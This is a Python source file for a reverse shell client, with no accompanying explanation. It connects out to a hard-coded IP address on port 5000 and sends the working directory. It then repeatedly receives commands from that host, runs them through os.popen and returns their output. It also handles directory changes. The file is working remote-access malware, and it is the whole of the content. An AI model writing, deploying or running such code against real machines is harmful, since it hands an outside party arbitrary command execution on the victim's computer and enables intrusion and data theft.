import socket
import os

SERVER_HOST = "76.189.177.142"
SERVER_PORT = 5000
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        cwd = os.getcwd()
        client_socket.send(cwd.encode())
        
        while True:
            command = client_socket.recv(BUFFER_SIZE).decode()
            command_parts = command.split(' ')

            if command == "exit":
                break
            elif command_parts[0] == "cd":
                if len(command_parts) > 1:
                    new_dir = command_parts[1]
                    try:
                        os.chdir(new_dir)
                        client_socket.send(b"")
                    except Exception as e:
                        error_message = str(e)
                        client_socket.send(error_message.encode())
                else:
                    client_socket.send(b"Invalid 'cd' command.")
            else:
                try:
                    result = os.popen(command).read()
                    client_socket.send(result.encode())
                except Exception as e:
                    error_message = str(e)
                    client_socket.send(error_message.encode())

            cwd = os.getcwd()
            message = f"{result}{SEPARATOR}{cwd}"
            client_socket.send(message.encode())
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    main()
